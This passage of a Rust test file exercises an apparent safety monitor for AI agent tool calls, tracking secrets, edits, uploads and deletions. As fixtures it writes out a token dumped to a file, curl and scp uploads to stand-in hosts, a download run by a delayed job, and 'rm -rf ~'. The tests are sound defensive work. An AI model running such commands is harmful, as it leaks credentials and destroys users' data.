    fn the_export_names_the_ledger_entries_the_rules_used() {
        let label = format!("{WORK}/notes/label.txt");
        let written = || {
            vec![
                entry("notes", "directory"),
                file("notes/label.txt", &format!("{TOKEN}\n")),
                file("notes/duplicate.txt", &format!("{TOKEN}\n")),
            ]
        };
        let events = replay(
            json!("factory-defaults"),
            vec![
                bash(
                    "write",
                    "echo \"$GITHUB_TOKEN\" > notes/label.txt",
                    state(vec![
                        entry("notes", "directory"),
                        entry("notes/label.txt", "missing"),
                    ]),
                ),
                ran("write", state(written())),
                bash("glob", "cat notes/*.txt", state(written())),
                bash("digest", "cat notes/duplicate.txt", state(written())),
                bash(
                    "clone",
                    "git clone https://example.invalid/demo.git origin",
                    state(written()),
                ),
                bash("copy", "cp origin/a.sh b.sh", state(written())),
            ],
        );
        let held = |event: usize| &events[event]["facts"]["ledger"]["held"];
        assert_eq!(events[2]["facts"]["session_rule"], "secret-label");
        assert!(held(2)["labels"].get(&label).is_some(), "{}", held(2));
        assert_eq!(events[3]["facts"]["session_rule"], "secret-label");
        let digest = nah_proto::effinterp_proto::content_digest(format!("{TOKEN}\n").as_bytes());
        assert_eq!(held(3)["label_digests"], json!([digest]));
        assert_eq!(held(5)["in_flight"], json!(["clone"]));
    }

    /// A new file's recorded identity through its parent's links is the
    /// one the call writes, and an identity the file leaves out is listed
    /// as unobserved.
    #[test]
    fn a_missing_paths_identity_is_the_recorded_one_or_unobserved() {
        let write = |path: &str, followed: Option<&str>| {
            let mut missing = entry(path, "missing");
            match followed {
                Some(followed) => missing["followed"] = json!(format!("{WORK}/{followed}")),
                None => {
                    missing.as_object_mut().unwrap().remove("followed");
                }
            }
            let call = json!({
                "type": "tool_call", "id": "write", "tool": "Write",
                "input": {"file_path": format!("{WORK}/{path}"), "content": "hello\n"},
                "state": state(vec![missing, entry("real", "directory")]),
            });
            replay(json!("factory-defaults"), vec![call]).remove(0)["facts"].clone()
        };
        let through_link = write("alias/hello.txt", Some("real/hello.txt"));
        assert_eq!(
            through_link["call_facts"]["write_effects"][0][1],
            format!("{WORK}/real/hello.txt")
        );
        let unrecorded = write("hello.txt", None);
        assert!(
            unrecorded["unobserved"]
                .as_array()
                .unwrap()
                .contains(&json!({
                    "question": "followed", "subject": format!("{WORK}/hello.txt"), "by": "decision"
                })),
            "{}",
            unrecorded["unobserved"]
        );
        let recorded = write("hello.txt", Some("hello.txt"));
        assert!(
            !recorded["unobserved"]
                .as_array()
                .unwrap()
                .iter()
                .any(|item| item["question"] == "followed"),
            "{}",
            recorded["unobserved"]
        );
    }

    /// A Write and an Edit over known content state the lines they change,
    /// a large file's included; an Edit whose old text is not in the file
    /// states none. A sed edit by line number states the lines it reaches
    /// and the lines around them, against the file before the call; a
    /// command after a `d` of its line, and NUL-split records, reach none
    /// it can state.
    #[test]
    fn edits_state_what_changed_and_where_a_line_address_lands() {
        let plan = || {
            state(vec![
                entry("notes", "directory"),
                file("notes/plan.txt", "one\ntwo\nthree\nfour\n"),
            ])
        };
        let path = format!("{WORK}/notes/plan.txt");
        let big_path = format!("{WORK}/notes/big.txt");
        let big_before: String = (1..=1300).map(|line| format!("line {line}\n")).collect();
        let big_after = big_before
            .replacen("line 1\n", "first\n", 1)
            .replace("line 1300\n", "last\n");
        let big = || {
            state(vec![
                entry("notes", "directory"),
                file("notes/big.txt", &big_before),
            ])
        };
        let events = replay(
            json!("factory-defaults"),
            vec![
                json!({"type": "tool_call", "id": "write", "tool": "Write",
                    "input": {"file_path": path, "content": "one\n2\nthree\nfour\nfive\n"}, "state": plan()}),
                json!({"type": "tool_call", "id": "edit", "tool": "Edit",
                    "input": {"file_path": path, "old_string": "three", "new_string": "3"}, "state": plan()}),
                bash("sed", "sed -i '2,3d' notes/plan.txt", plan()),
                bash(
                    "sed-two",
                    "sed -i -e '4s/fo;ur/4/g' -e '$a end; more' notes/plan.txt",
                    plan(),
                ),
                json!({"type": "tool_call", "id": "miss", "tool": "Edit",
                    "input": {"file_path": path, "old_string": "absent", "new_string": "x"}, "state": plan()}),
                json!({"type": "tool_call", "id": "large", "tool": "Write",
                    "input": {"file_path": big_path, "content": big_after}, "state": big()}),
                bash(
                    "sed-flow",
                    "sed -i '2d;2s/two/2/;18446744073709551615d' notes/plan.txt",
                    plan(),
                ),
                bash("sed-nul", "sed -z -i '2d' notes/plan.txt", plan()),
            ],
        );
        let span = |line: usize, count: usize| json!({"line": line, "count": count});
        let edit = |event: usize| events[event]["edits"][0].clone();
        assert_eq!(edit(0)["prior"], "known");
        assert_eq!(
            edit(0)["changes"],
            json!([
                {"change": "replaced", "old": span(2, 1), "new": span(2, 1)},
                {"change": "added", "old": span(5, 0), "new": span(5, 1)},
            ])
        );
        assert_eq!(
            edit(1)["changes"],
            json!([{"change": "replaced", "old": span(3, 1), "new": span(3, 1)}])
        );
        let line = |line: usize, text: &str| json!({"line": line, "text": text});
        assert_eq!(
            edit(2)["addressed"],
            json!([{"command": "d", "first": 2, "last": 3, "reached": 2,
                "lands_on": [line(2, "two"), line(3, "three")],
                "before": line(1, "one"), "after": line(4, "four")}])
        );
        // An address names the line before the edit, so `$` is the fourth;
        // a `;` inside a substitution or appended text ends no command.
        assert_eq!(
            edit(3)["addressed"],
            json!([
                {"command": "s", "first": 4, "last": 4, "reached": 1, "lands_on": [line(4, "four")],
                    "before": line(3, "three"), "after": null},
                {"command": "a", "first": 4, "last": 4, "reached": 1, "lands_on": [line(4, "four")],
                    "before": line(3, "three"), "after": null},
            ])
        );
        assert_eq!(events[4]["edits"], json!([]));
        assert_eq!(
            edit(5)["changes"],
            json!([
                {"change": "replaced", "old": span(1, 1), "new": span(1, 1)},
                {"change": "replaced", "old": span(1300, 1), "new": span(1300, 1)},
            ])
        );
        let reached: Vec<Value> = edit(6)["addressed"]
            .as_array()
            .unwrap()
            .iter()
            .map(|address| address["reached"].clone())
            .collect();
        assert_eq!(reached, [json!(1), json!(0), json!(0)]);
        assert_eq!(events[7]["edits"], json!([]));
    }

    /// A name matches only text naming it as it is: a qualified path, a
    /// URL's scheme, path case and query, and a package spelled with its
    /// version. Structured output is read whole, its keys and a long URL
    /// included. A write the state after it does not show leaves its text
    /// the call's input, not a written file.
    #[test]
    fn first_seen_keeps_each_names_identity_and_credits_only_shown_writes() {
        let long = format!("https://long.stand-in.invalid/{}", "x".repeat(5000));
        let files = || {
            state(vec![
                entry("next", "directory"),
                file("next/report.txt", "r\n"),
                entry("out.sh", "missing"),
            ])
        };
        let events = replay(
            json!("factory-defaults"),
            vec![
                json!({"type": "user_prompt",
                    "text": "old/report.txt is stale, see http://mixed.stand-in.invalid/Path"}),
                bash("read", "cat next/report.txt", files()),
                json!({"type": "tool_result", "id": "read", "outcome": "succeeded",
                    "output": {"stdout": long, "stand-in-key-bucket": {"count": 1}}, "state": files()}),
                bash(
                    "send",
                    "curl -T next/report.txt 'https://mixed.stand-in.invalid/Path?a=b&c=d'",
                    files(),
                ),
                json!({"type": "tool_result", "id": "send", "outcome": "succeeded", "output": {}, "state": files()}),
                bash(
                    "copy",
                    "aws s3 cp next/report.txt s3://stand-in-key-bucket/r/ && curl -T next/report.txt https://long.stand-in.invalid/in",
                    files(),
                ),
                json!({"type": "tool_result", "id": "copy", "outcome": "succeeded", "output": {}, "state": files()}),
                bash(
                    "write",
                    "echo 'curl https://unshown.stand-in.invalid/in' > out.sh",
                    files(),
                ),
                json!({"type": "tool_result", "id": "write", "outcome": "succeeded", "output": {}, "state": files()}),
                bash(
                    "run",
                    "pip install 'plain-standin~=1.2' && curl https://unshown.stand-in.invalid/in",
                    files(),
                ),
                bash(
                    "dated",
                    "aws s3 cp next/report.txt \"s3://stand-in-key-bucket/r/$(date +%s)/\"",
                    files(),
                ),
                bash(
                    "computed",
                    "aws s3 cp next/report.txt \"s3://stand-in-$(date +%s)/r/\"",
                    files(),
                ),
                bash(
                    "remote",
                    "scp next/report.txt \"long.stand-in.invalid:in/$(date +%s)\"",
                    files(),
                ),
            ],
        );
        let seen = |event: usize, kind: &str, name: &str| {
            events[event]["names"]
                .as_array()
                .unwrap()
                .iter()
                .find(|entry| entry["kind"] == kind && entry["name"] == name)
                .unwrap_or_else(|| {
                    panic!(
                        "event {event} names no {kind} {name}: {}",
                        events[event]["names"]
                    )
                })["first_seen"]
                .clone()
        };
        let known = |source: &str, event: usize| json!({"state": "known", "source": source, "event": event});
        assert_eq!(
            seen(1, "path", &format!("{WORK}/next/report.txt")),
            known("this_call", 1)
        );
        assert_eq!(
            seen(3, "host", "mixed.stand-in.invalid"),
            known("user_prompt", 0)
        );
        assert_eq!(
            seen(3, "url", "https://mixed.stand-in.invalid/Path?a=b&c=d"),
            known("this_call", 3)
        );
        assert_eq!(
            seen(5, "bucket", "stand-in-key-bucket"),
            known("tool_output", 2)
        );
        assert_eq!(
            seen(5, "host", "long.stand-in.invalid"),
            known("tool_output", 2)
        );
        assert_eq!(
            seen(9, "host", "unshown.stand-in.invalid"),
            known("tool_call", 7)
        );
        assert_eq!(seen(9, "package", "plain-standin"), known("this_call", 9));
        // A bucket the leading literal fixes is named though the rest of
        // the destination is computed, and says so; a computed bucket is
        // no name.
        let name = |event: usize, kind: &str| {
            events[event]["names"]
                .as_array()
                .unwrap()
                .iter()
                .find(|entry| entry["kind"] == kind)
                .cloned()
        };
        assert_eq!(name(5, "bucket").unwrap()["rest_unresolved"], false);
        let dated = name(10, "bucket").unwrap();
        assert_eq!(dated["name"], "stand-in-key-bucket");
        assert_eq!(dated["rest_unresolved"], true);
        assert_eq!(dated["first_seen"], known("tool_output", 2));
        assert_eq!(name(11, "bucket"), None);
        // A transfer's endpoint keeps the host and drops a computed path.
        assert_eq!(name(12, "host").unwrap()["rest_unresolved"], true);
    }

    /// A block on content the state left out rests on that question and
    /// is open; a block on content no one can see rests on none; a delegate
    /// for a script the state left out rests on it, and may rest on more.
    #[test]
    fn each_verdict_says_which_unanswered_questions_it_rested_on() {
        let later = || entry("later.sh", "missing");
        // The shell is chosen from a declared environment, so no verdict
        // rests on choosing it.
        let declared = |paths: Vec<Value>| {
            let mut state = state(paths);
            state["env"]["SHELL"] = json!(null);
            state["env"]["CLAUDE_CODE_SHELL"] = json!(null);
            state
        };
        let launch = |id: &str| bash(id, "(sleep 30; sh later.sh) &", declared(vec![later()]));
        let rested = |events: &[Value], event: usize| {
            let facts = &events[event]["facts"];
            let positions = facts["rested_on"]["unobserved"].as_array().unwrap();
            let questions: Vec<Value> = positions
                .iter()
                .map(|position| facts["unobserved"][position.as_u64().unwrap() as usize].clone())
                .collect();
            (
                questions,
                facts["rested_on"]["complete"].clone(),
                facts["rested_on"]["open"].clone(),
            )
        };
        // A run of content flagged when written, whose bytes the state
        // leaves out, is matched by its path.
        let flagged = replay(
            json!("factory-defaults"),
            vec![
                json!({"type": "tool_call", "id": "write", "tool": "Write",
                    "input": {"file_path": format!("{WORK}/later.sh"), "content": "rm -rf ~\n"},
                    "state": declared(vec![later()])}),
                ran("write", declared(vec![file("later.sh", "rm -rf ~\n")])),
                bash(
                    "run",
                    "sh later.sh",
                    declared(vec![entry("later.sh", "file")]),
                ),
            ],
        );
        assert_eq!(flagged[2]["facts"]["session_rule"], "flagged-content-run");
        assert_eq!(
            rested(&flagged, 2),
            (
                vec![
                    json!({"question": "digest", "subject": format!("{WORK}/later.sh"), "by": "session-memory"})
                ],
                json!(true),
                json!(true)
            )
        );
        let download = replay(
            json!("factory-defaults"),
            vec![
                launch("launch"),
                ran("launch", declared(vec![later()])),
                bash(
                    "fetch",
                    "curl -o later.sh https://example.invalid/x.sh",
                    declared(vec![later()]),
                ),
            ],
        );
        assert_eq!(download[2]["facts"]["session_rule"], "pending-launch");
        assert_eq!(rested(&download, 2), (vec![], json!(true), json!(false)));
        // A native write is planned in no shell, so not choosing one is
        // nothing it rested on.
        let write = replay(
            json!("factory-defaults"),
            vec![json!({
                "type": "tool_call", "id": "write", "tool": "Write",
                "input": {"file_path": format!("{WORK}/notes.txt"), "content": "hello\n"},
                "state": state(vec![entry("notes.txt", "missing")]),
            })],
        );
        assert!(
            write[0]["facts"]["unobserved"]
                .as_array()
                .unwrap()
                .iter()
                .any(|entry| entry["question"] == "env"),
            "{}",
            write[0]["facts"]["unobserved"]
        );
        // Only the Git hooks the state leaves out may matter to it.
        assert_eq!(rested(&write, 0), (vec![], json!(false), json!("unknown")));
        let script = replay(
            json!("factory-defaults"),
            vec![bash(
                "run",
                "sh run.sh",
                declared(vec![entry("run.sh", "file")]),
            )],
        );
        let (questions, complete, open) = rested(&script, 0);
        assert!(
            questions.contains(
                &json!({"question": "source", "subject": format!("{WORK}/run.sh"), "by": "decision"})
            ),
            "{questions:?}"
        );
        assert_eq!((complete, open), (json!(false), json!(true)));
    }

    /// Each delete `rm` asks about first is stated with the option that
    /// decides it, the same through a function; an option a later one
    /// turns off, `-I` over few files, a long option and an option after an
    /// operand state nothing.
    #[test]
    fn deletes_rm_asks_about_first_are_stated() {
        let files = || {
            state(
                ["a", "b", "c", "d"]
                    .map(|name| file(name, "x\n"))
                    .into_iter()
                    .collect(),
            )
        };
        let commands = [
            ("rm -i a", Some(("each", "-i"))),
            ("rm -f -i a", Some(("each", "-i"))),
            ("rmi() { rm -i \"$@\"; }; rmi a", Some(("each", "-i"))),
            ("rm -I a b c d", Some(("once", "-I"))),
            ("rm a", None),
            ("rm -i -f a", None),
            ("rm -I a", None),
            ("rm --interactive=never a", None),
            ("rm a -i", None),
        ];
        let events = replay(
            json!("factory-defaults"),
            commands
                .iter()
                .enumerate()
                .map(|(index, (command, _))| bash(&index.to_string(), command, files()))
                .collect(),
        );
        for ((command, expected), event) in commands.iter().zip(&events) {
            let asks: Vec<(&str, &str)> = event["asks"]
                .as_array()
                .unwrap()
                .iter()
                .map(|ask| {
                    (
                        ask["asks"].as_str().unwrap(),
                        ask["option"].as_str().unwrap(),
                    )
                })
                .collect();
            let deletes: Vec<&Value> = event["facts"]["plan"]["effects"]
                .as_array()
                .unwrap()
                .iter()
                .filter(|effect| effect["operation"] == "filesystem.delete")
                .collect();
            match expected {
                Some(ask) => {
                    assert_eq!(asks, vec![*ask; deletes.len()], "{command}");
                    assert_eq!(event["asks"][0]["effect"], deletes[0]["id"], "{command}");
                }
                None => assert_eq!(asks, vec![], "{command}"),
            }
        }
    }

    /// An `rm` alias in a supplied profile states an ask that names the
    /// alias and its file, apart from one an option in the call states,
    /// whatever else the call or profile spells; a spelling the alias does
    /// not reach, a later `-f`, and an alias the shell reading the profile
    /// never defines state none.
    #[test]
    fn a_profile_alias_states_an_ask_only_if_the_shell_loads_it() {
        let with_bashrc = |profile: &str| {
            let mut state = state(vec![file("a", "x\n")]);
            let bashrc = format!("{HOME}/.bashrc");
            for entry in state["paths"].as_array_mut().unwrap() {
                if entry["requested"] == bashrc {
                    *entry = json!({"requested": bashrc, "resolved": bashrc, "realpath": bashrc,
                        "kind": "file", "exists": true, "contents": profile});
                }
            }
            state
        };
        let alias = "alias rm='rm -i'\n";
        let calls = [
            ("rm a", alias, Some(true)),
            ("rm -i a", alias, Some(false)),
            ("\\rm a", alias, None),
            ("command rm a", alias, None),
            ("/bin/rm a", alias, None),
            ("sudo rm a", alias, None),
            ("rm -f a", alias, None),
            ("rm a; echo alias", alias, Some(true)),
            ("NOTE='x y' rm a", alias, Some(true)),
            ("rm a", "alias   rm=rm\\ -i\n", Some(true)),
            (
                "rm a",
                "alias rm='rm -i'\nalias cleanup='rm -f'\n",
                Some(true),
            ),
            ("rm a", "if true; then\n  alias rm='rm -i'\nfi\n", None),
            (
                "rm a",
                "if false; then\n  echo 'fi' # fi\n  alias rm='rm -i'\nfi\n",
                None,
            ),
            ("rm a", "cat <<'END'\nalias rm='rm -i'\nEND\n", None),
            ("rm a", "(\n  alias rm='rm -i'\n)\n", None),
            ("rm a", "alias rm='rm -i'\nunalias rm\n", None),
        ];
        let events = replay(
            json!("factory-defaults"),
            calls
                .iter()
                .enumerate()
                .map(|(index, (command, profile, _))| {
                    bash(&index.to_string(), command, with_bashrc(profile))
                })
                .collect(),
        );
        for ((command, profile, expected), event) in calls.iter().zip(&events) {
            let asks = event["asks"].as_array().unwrap();
            match expected {
                Some(from_alias) => {
                    assert_eq!(asks.len(), 1, "{command} {profile:?}");
                    assert_eq!(asks[0]["asks"], "each", "{command}");
                    let expected = from_alias.then(|| {
                        json!({"name": "rm", "file": format!("{HOME}/.bashrc"), "applies": "if-shell-loads-file"})
                    });
                    assert_eq!(asks[0].get("alias"), expected.as_ref(), "{command}");
                }
                None => assert_eq!(asks, &Vec::<Value>::new(), "{command} {profile:?}"),
            }
        }
    }

    /// A link inside a folder a call archives that leads out of it is named
    /// with where it leads and whether each archiving read follows it; a
    /// link that stays inside the folder, and one a search only reads, are
    /// not.
    #[test]
    fn links_leading_out_of_an_archived_folder_are_named() {
        let folder = |links: Value| {
            let mut entry = entry("run", "directory");
            entry["descendants"] = json!([format!("{WORK}/run/metrics.txt")]);
            entry["links"] = links;
            entry
        };
        let out = json!([[format!("{WORK}/run/data"), "/stand-in/shared"]]);
        let inside = json!([[format!("{WORK}/run/alias"), format!("{WORK}/run/inner")]]);
        let calls = [
            ("zip -rq /tmp/run.zip run", out.clone(), vec![true]),
            ("zip -ryq /tmp/run.zip run", out.clone(), vec![false]),
            (
                "zip -ryq /tmp/run.zip run; zip -rq /tmp/run.zip run",
                out.clone(),
                vec![false, true],
            ),
            ("grep -R needle run", out, vec![]),
            ("zip -rq /tmp/run.zip run", inside, vec![]),
        ];
        let events = replay(
            json!("all-enabled"),
            calls
                .iter()
                .enumerate()
                .map(|(index, (command, links, _))| {
                    let target = json!({"requested": "/tmp/run.zip", "resolved": "/tmp/run.zip",
                        "kind": "missing", "exists": false});
                    bash(
                        &index.to_string(),
                        command,
                        state(vec![
                            folder(links.clone()),
                            entry("run/metrics.txt", "file"),
                            target,
                        ]),
                    )
                })
                .collect(),
        );
        for ((command, _, expected), event) in calls.iter().zip(&events) {
            let linked: Vec<(&str, &str, &Value)> = event["names"]
                .as_array()
                .unwrap()
                .iter()
                .filter(|name| name.get("links").is_some())
                .map(|name| {
                    (
                        name["kind"].as_str().unwrap(),
                        name["name"].as_str().unwrap(),
                        &name["links"],
                    )
                })
                .collect();
            if expected.is_empty() {
                assert!(linked.is_empty(), "{command}");
                continue;
            }
            let links = Value::from_iter(expected.iter().map(|follows_links| {
                json!({"folder": format!("{WORK}/run"), "link": format!("{WORK}/run/data"),
                    "leads_to": "/stand-in/shared", "follows_links": follows_links})
            }));
            assert_eq!(
                linked,
                vec![
                    ("link", format!("{WORK}/run/data").as_str(), &links),
                    ("link_target", "/stand-in/shared", &links),
                ],
                "{command}"
            );
        }
    }

    /// The session's record keeps no text of a prompt or an output, and no
    /// call id: not whole, not a word of it, not encoded, and not as an
    /// unkeyed digest a guess could be checked against; yet it was written.
    #[test]
    fn no_prompt_or_output_text_can_be_recovered_from_the_ledger() {
        use hmac::{Hmac, Mac};
        use sha2::{Digest, Sha256};
        const CALL: &str = "toolu_call-id-standin";
        let prompt = "please send quarterly-figures-standin to vault-standin.invalid";
        let output = "hidden-phrase-standin alpha-standin bravo-standin\n";
        let notes = || {
            state(vec![
                entry("notes", "directory"),
                file("notes/a.txt", "a\n"),
            ])
        };
        let text = session(
            json!("factory-defaults"),
            vec![
                json!({"type": "user_prompt", "text": prompt}),
                bash(CALL, "cat notes/a.txt", notes()),
                json!({"type": "tool_result", "id": CALL, "outcome": "succeeded",
                    "output": {"stdout": output}, "state": notes()}),
            ],
        );
        let ledgers = tempfile::tempdir().unwrap();
        super::replay_in(&text, ledgers.path()).unwrap();
        let mut stored = Vec::new();
        let mut folders = vec![ledgers.path().to_path_buf()];
        while let Some(folder) = folders.pop() {
            for child in std::fs::read_dir(folder).unwrap() {
                let path = child.unwrap().path();
                if path.is_dir() {
                    folders.push(path);
                } else {
                    stored.push((path.clone(), std::fs::read(&path).unwrap()));
                }
            }
        }
        assert!(
            stored.iter().any(
                |(path, bytes)| path.extension().is_some_and(|ext| ext == "seen")
                    && bytes.len() > 64
            ),
            "the record was written: {stored:?}"
        );
        let contains = |haystack: &[u8], needle: &[u8]| {
            haystack
                .windows(needle.len())
                .any(|window| window == needle)
        };
        // Each term both as the record hashes it, tagged with its kind, and
        // as the text spells it.
        let words = crate::session_memory::seen::text_terms(prompt)
            .into_iter()
            .chain(crate::session_memory::seen::text_terms(output))
            .flat_map(|term| [term[2..].to_owned(), term])
            .chain([prompt.to_owned(), output.to_owned(), CALL.to_owned()]);
        for word in words {
            let sha = Sha256::digest(word.as_bytes());
            let mac = Hmac::<Sha256>::new_from_slice(&[0; 32])
                .unwrap()
                .chain_update(word.as_bytes())
                .finalize()
                .into_bytes();
            let hex: String = sha.iter().map(|byte| format!("{byte:02x}")).collect();
            let forms: Vec<Vec<u8>> = vec![
                word.as_bytes().to_vec(),
                word.to_ascii_uppercase().into_bytes(),
                word.bytes()
                    .map(|byte| format!("{byte:02x}"))
                    .collect::<String>()
                    .into_bytes(),
                sha[..8].to_vec(),
                hex.into_bytes(),
                mac[..8].to_vec(),
                nah_proto::effinterp_proto::content_digest(word.as_bytes()).into_bytes(),
            ];
            for (path, bytes) in &stored {
                for form in &forms {
                    assert!(
                        form.len() < 3 || !contains(bytes, form),
                        "{word:?} recoverable from {}",
                        path.display()
                    );
                }
            }
        }
    }
}
